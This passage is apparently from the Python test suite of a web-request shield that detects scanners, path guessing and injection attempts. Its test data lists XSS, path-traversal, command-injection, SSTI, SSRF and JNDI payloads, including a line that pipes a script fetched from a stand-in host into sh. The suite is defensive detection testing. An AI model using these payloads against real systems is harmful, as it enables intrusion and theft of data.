        "javascript://%0aalert(1)", "javascript:%0aalert(1)", "javascript:void(0);alert(1)", '<a href="javascript:alert(1)">x</a>',
        '" onmouseover="alert(1)', "' onfocus='alert(1)' autofocus='", '" autofocus onfocus=alert(1) x="',
        "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "<marquee onstart=alert(1)>", "<img src=x onerror=alert`1`>",
        "<video><source onerror=alert(1)>", '<object data="javascript:alert(1)">', "x onerror=alert(1)",
        "<img src=x onerror=alert;throw 1>", "<form action=javascript:alert(1)><input type=submit>",
    ],
    "payload:traversal": [
        "../../../etc/passwd", "../../../../../../etc/passwd", "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
        "../../../../windows/win.ini", "/etc/passwd", "../../../../proc/self/environ", "../../WEB-INF/web.xml", "../../.env",
        "../../../../../../boot.ini", "../../config.php", "../../../app/etc/env.php", "..%2f..%2f..%2fetc%2fpasswd",
    ],
    "payload:cmdi": [
        "; cat /etc/passwd", "| whoami", "|| id", "&& whoami", "$(whoami)", "`id`", "; sleep 5", "| ping -c 5 127.0.0.1",
        "\ncat /etc/passwd", "; curl http://x.example/s.sh | sh", "127.0.0.1; ls -la",
    ],
    "payload:ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}", "{{self.__init__.__globals__}}", "{{7*'7'}}"],
    "payload:ssrf-metadata": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"],
    "payload:jndi": ["${jndi:ldap://x.oast.fun/a}"],
}


class SearchText(unittest.TestCase):
    """Search boxes take free text. A title, a recipe or a programming question
    must not read as an attack; the attack itself still must."""

    def payload_hits(self, query, path="/search"):
        s, _ = shield()
        return [h for h in s.check("192.0.2.140", "GET", path, query, BROWSER).hits if h.startswith("payload:")]

    def test_everyday_searches_are_not_payloads(self):
        scored = {text: hits for text in EVERYDAY_SEARCHES
                  if (hits := self.payload_hits("q=" + urllib.parse.quote_plus(text)))}
        self.assertEqual(scored, {})

    def test_everyday_searches_are_served(self):
        s, c = shield()
        visit = wsgi_site(s, real=("/search",))
        for text in EVERYDAY_SEARCHES * 3:        # one person searching for all of it, three times over
            c.t += 4
            self.assertEqual(visit("/search", "q=" + urllib.parse.quote_plus(text)), 200, text)
        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)

    def test_attack_payloads_are_still_caught(self):
        missed = {}
        for label, payloads in ATTACK_PAYLOADS.items():
            for payload in payloads:
                for query in ("id=" + urllib.parse.quote(payload, safe=""), "q=" + urllib.parse.quote_plus(payload)):
                    if label not in self.payload_hits(query, "/item"):
                        missed.setdefault(label, []).append(query)
        self.assertEqual(missed, {})


class SlowGuessing(unittest.TestCase):
    """Issue 10: staying under the per-minute limit used to be free for ever."""

    def test_slow_path_guessing_runs_out_of_budget(self):
        s, c = shield()
        visit = wsgi_site(s)
        answers = []
        for i in range(12 * 60 * 3):              # twelve guesses a minute, for three hours
            c.t += 5
            answers.append(visit(f"/guess-{i}"))
        self.assertEqual(answers[:60], [404] * 60)                # inside the hourly allowance
        self.assertEqual(answers[-1], 403)
        self.assertLess(answers.count(404), 200)                  # was all 2,160
        self.assertIn("192.0.2.200", s.blocklist())

    def test_a_patient_guesser_is_held_to_the_allowance(self):
        s, c = shield()
        visit = wsgi_site(s)
        found = 0
        for i in range(14 * 60 * 24):             # the old free rate, kept up for a day
            c.t += 60 / 14
            found += visit(f"/guess-{i}") == 404
        self.assertLess(found, 24 * 80)           # was 20,160; now about the allowance, 60 an hour

    def test_dead_links_inside_the_allowance_cost_nothing(self):
        s, c = shield()
        visit = wsgi_site(s)
        for hour in range(6):                     # fifty different dead links an hour, all day
            for i in range(50):
                c.t += 72
                self.assertEqual(visit(f"/old/page-{hour}-{i}"), 404)
        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)
        s2, c2 = shield(slow_enum_budget=0)       # and the allowance can be switched off
        visit2 = wsgi_site(s2)
        for i in range(300):
            c2.t += 5
            self.assertEqual(visit2(f"/guess-{i}"), 404)

    def test_recon_names_are_recognised_below_the_root(self):
        for path in ["/api/swagger.json", "/api/v1/openapi.json", "/api/graphql", "/app/actuator/env",
                     "/backend/v2/api-docs", "/blog/wp-login.php", "/tools/phpmyadmin/index.php", "/x/y/swagger-ui/",
                     "/swagger.json", "/admin/users", "/console", "/metrics", "/debug/vars"]:
            s, _ = shield()
            wsgi_site(s)(path)
            self.assertEqual(s._tracks["192.0.2.200"].hard, 25, path)

    def test_plain_words_are_recon_only_at_the_root(self):
        s, c = shield()
        visit = wsgi_site(s)
        for path in ["/shop/console", "/games/console/ps5", "/blog/admin-tips", "/docs/metrics", "/team/admin",
                     "/api/metrics-report", "/guides/debug", "/swaggering", "/my-api-docs-notes", "/graphqlx"]:
            c.t += 30
            self.assertEqual(visit(path), 404)
        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)


class WebSockets(unittest.TestCase):
    """Issue 12: a WebSocket handshake is a request like any other."""

    def connect(self, s, ip, path="/ws", query=b"", ua=CHROME, extra=()):
        reached, sent = [], []

        async def app(scope, receive, send):
            reached.append(scope["type"])
            await send({"type": "websocket.accept"})

        async def receive():
            return {"type": "websocket.connect"}

        async def send(message):
            sent.append(message)

        scope = {"type": "websocket", "path": path, "query_string": query, "client": (ip, 5555),
                 "headers": [(b"host", b"shop.example"), (b"user-agent", ua.encode()), (b"accept-language", b"en"),
                             (b"upgrade", b"websocket")] + list(extra)}
        asyncio.run(ShieldASGI(app, s)(scope, receive, send))
        return reached, [m["type"] for m in sent], sent

    def test_blocked_address_cannot_open_a_websocket(self):
        s, _ = shield()
        s.check("203.0.113.120", "GET", "/", headers=SCANNER)
        reached, types, sent = self.connect(s, "203.0.113.120")
        self.assertEqual((reached, types), ([], ["websocket.close"]))
        self.assertEqual(sent[0]["code"], 1008)

    def test_handshake_is_scored_like_a_request(self):
        s, _ = shield()
        reached, types, _ = self.connect(s, "203.0.113.121", ua="sqlmap/1.9")
        self.assertEqual((reached, types), ([], ["websocket.close"]))
        self.assertIn("203.0.113.121", s.blocklist())
        reached, types, _ = self.connect(s, "203.0.113.122", query=b"room=1%27%20UNION%20SELECT%20null--")
        self.assertEqual((reached, types), ([], ["websocket.close"]))
        self.assertEqual(s._tracks["203.0.113.122"].hard, 50)

    def test_ordinary_websocket_goes_through(self):
        s, _ = shield()
        own_page = [(b"sec-fetch-site", b"same-origin"), (b"sec-fetch-mode", b"websocket"),
                    (b"sec-fetch-dest", b"websocket"), (b"origin", b"https://shop.example")]
        for _ in range(3):
            reached, types, _ = self.connect(s, "192.0.2.250", query=b"room=7&id=5", extra=own_page)
            self.assertEqual((reached, types), (["websocket"], ["websocket.accept"]))
        self.assertIn("192.0.2.250", s._tracks)                   # the site's own script: scored as the visitor's own

    def test_monitor_mode_lets_the_handshake_through(self):
        s, _ = shield(mode="monitor")
        reached, types, _ = self.connect(s, "203.0.113.123", ua="sqlmap/1.9")
        self.assertEqual((reached, types), (["websocket"], ["websocket.accept"]))

    def test_other_scopes_are_passed_on(self):
        reached = []

        async def app(scope, receive, send):
            reached.append(scope["type"])

        asyncio.run(ShieldASGI(app, shield()[0])({"type": "lifespan"}, None, None))
        self.assertEqual(reached, ["lifespan"])


class TextEdges(unittest.TestCase):
    """Where reading text the way Python does decides the outcome. Ports
    follow spec/SPEC.md's porting notes; these cases put it in the vectors."""

    def test_a_newline_at_the_end_does_not_hide_a_name(self):
        s, _ = shield()
        d = s.check("192.0.2.150", "GET", "/id_rsa%0A", headers=BROWSER)   # $ matches before a final newline
        self.assertIn("decoy:sensitive-file-probe", d.hits)

    def test_names_are_whole_words_in_any_script(self):
        s, _ = shield()
        self.assertIn("decoy:sensitive-file-probe", s.check("192.0.2.151", "GET", "/.env.local", headers=BROWSER).hits)
        self.assertEqual(s.check("192.0.2.152", "GET", "/.env%C3%A9", headers=BROWSER).hits, [])   # é: no boundary

    def test_cadence_turns_on_the_spread_of_the_gaps(self):
        for spread, flagged in ((0.34, True), (0.36, False)):           # the limit is a 0.35 coefficient of variation
            s, c = shield()
            hits = []
            for i in range(40):
                c.t += 1.0 + (spread if i % 2 else -spread)
                hits += s.check("203.0.113.160", "GET", "/api/items", headers=BROWSER).hits
            self.assertEqual("behavior:metronomic-cadence" in hits, flagged, spread)

    def test_ipv6_networks_are_written_in_canonical_form(self):
        s, _ = shield()
        for addr in ("2001:db8:0:5::1", "2001:0:0:5:1::", "2001:db8:a:0:ffff::1", "2001:DB8:B::1"):
            s.check(addr, "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
        self.assertEqual(sorted(s.blocklist()),
                         ["2001:0:0:5::/64", "2001:db8:0:5::/64", "2001:db8:a::/64", "2001:db8:b::/64"])


# Starts of SQL, markup and paths that a pattern can almost match, and runs to
# follow them: the same lists are in every port's cost test.
LEADS = ["'", '"', "' or", "' or 1", "' or true", "' or '", "' )", "' ) or", "' or (", "union select a", "union select 1",
         "or", "1", "<script", "javascript:", "../", "${", "{{"]
RUNS = [" ", "\t", "\n", ")", ") ", " )", "(", "1", "'"]


class Cost(unittest.TestCase):
    """The shield reads attacker-controlled text on every request, so no input
    may make that slow. Budgets are several times what a linear scan needs."""
    BUDGET = 0.25

    def timed(self, fn):
        best = None
        for _ in range(2):                        # best of two: ignore a scheduling hiccup
            t0 = time.perf_counter()
            fn()
            took = time.perf_counter() - t0
            best = took if best is None else min(best, took)
            if best < self.BUDGET:
                break
        return best

    def test_every_pattern_scans_in_linear_time(self):
        patterns = [("HARD_UA " + label, rx) for rx, _, label in signatures.HARD_UA]
        patterns += [("SOFT_UA " + label, rx) for rx, _, label in signatures.SOFT_UA]
        patterns += [(label, rx) for rx, label in signatures.PAYLOADS + signatures.OOB]
        patterns += [(name, rx) for name, rx in vars(signatures).items() if isinstance(rx, re.Pattern)]
        self.assertGreaterEqual(len(patterns), 26)
        # Repeated fragments each pattern almost matches: the shape that makes a
        # backtracking engine retry from every position.
        atoms = ["a", "db", "a-", "a.", "/", " ", "\n", "\r\n ", "; ", ";\n", "/*", "/* a ", "*/", "' or ", "{{ ", " on",
                 " onmouse", "#{1", "${T", "../", "..\\", "javascript:", "javascript: ", "<script>", "<script ",
                 "' and '1", "' or 1 ", "union select ", "1 union select ", "sleep(", "<iframe ", "<x onclick=",
                 "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
                 "' ", "' or ", "sleep ( ", "; ", "| cat ", "{{1 ", "${ ", "<%= 1", "on", "onload ", "<svg",
                 "backup.", "/wp-config.php.a", "/swagger/", "/admin/", "x.oast", "-.", "curl/"]
        slow = []
        for name, rx in patterns:
            for atom in atoms:
                text = atom * (30000 // len(atom))
                for subject in (text, "/" + text + "!"):
                    took = self.timed(lambda: (rx.search(subject), rx.match(subject)))
                    if took >= self.BUDGET:
                        slow.append(f"{name} on {atom!r} x {len(subject) // len(atom)}: {took:.2f} s")
            # Something a pattern almost matches, then one long run: a run that
            # two quantifiers can share (\s*\)?\s*) is retried split every way.
            for lead in LEADS:
                for run in RUNS:
                    subject = lead + run * (30000 // len(run)) + "!"
                    took = self.timed(lambda: rx.search(subject))
                    if took >= self.BUDGET:
                        slow.append(f"{name} on {lead!r} + {run!r} x {30000 // len(run)}: {took:.2f} s")
        self.assertEqual(slow, [])

    def test_oversized_requests_are_checked_quickly(self):
        s, _ = shield()
        padded = dict(BROWSER, **{f"X-Pad-{i}": "a" * 8000 for i in range(60)})
        cases = {"60 padded headers": lambda: s.check("192.0.2.90", "GET", "/", "", padded),
                 "8000-character path": lambda: s.check("192.0.2.91", "GET", "/" + "db" * 4000 + "!", "", BROWSER),
                 "60000-character query": lambda: s.check("192.0.2.92", "GET", "/", "a" * 60000, BROWSER),
                 "20000 query parameters": lambda: s.check("192.0.2.93", "GET", "/", "a=b&" * 20000, BROWSER),
                 "a quote, then 60000 spaces": lambda: s.check("192.0.2.97", "GET", "/", "q='+or" + "+" * 60000, BROWSER),
                 "8000-character user agent": lambda: s.check(
                     "192.0.2.94", "GET", "/", "", {"User-Agent": "Mozilla/5.0 " * 660}),
                 "8000-character referer": lambda: s.check(
                     "192.0.2.95", "GET", "/", "", dict(BROWSER, Host="shop.example", Referer="https://" + "a." * 4000))}
        for name, fn in cases.items():
            self.assertLess(self.timed(fn), self.BUDGET, name)

    def test_request_scanning_does_not_hold_the_lock(self):
        # Decoding and pattern matching depend only on the request. Doing them
        # under the lock would make every other request wait behind a slow one.
        s, _ = shield()
        free, real = [], core._decode

        def decode_and_probe(text):
            def probe():
                got = s._lock.acquire(blocking=False)
                if got:
                    s._lock.release()
                free.append(got)
            other = threading.Thread(target=probe)
            other.start()
            other.join()
            return real(text)

        with mock.patch.object(core, "_decode", decode_and_probe):
            d = s.check("203.0.113.18", "GET", "/search", "q=1%27%20UNION%20SELECT%201", BROWSER)
        self.assertIn("payload:sqli", d.hits)
        self.assertTrue(free and all(free), free)


if __name__ == "__main__":
    unittest.main()
